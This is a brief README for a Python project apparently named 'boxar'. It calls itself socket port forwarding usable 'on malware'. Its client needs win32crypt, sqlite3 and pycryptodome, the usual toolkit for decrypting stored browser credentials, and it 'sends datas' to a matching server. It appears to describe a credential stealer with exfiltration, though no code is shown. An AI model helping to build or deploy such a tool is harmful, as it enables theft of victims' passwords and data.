# Version 
0.0.1

# Whats that?
this is a simple port forwarding with socket lib , also it can be use on malware :)

# Need Libraries
+ On Client:
    getpass
    sqlite3 
    shutil
    win32crypt
    pycryptodome / crypto / Crypto

+ On Server:
    Nothing :>

# How Work?

+ server side: 
    python3 serverSide.py --ip #<ip> --port #<port>

    + its important : should the ip and port in server same as ip and port in client !

+ client side:
    python3 clientSide.py 

    + and that send datas 

# Usage & Clone
```
git clone https://github.com/Zrexer/boxar
cd ./boxar
```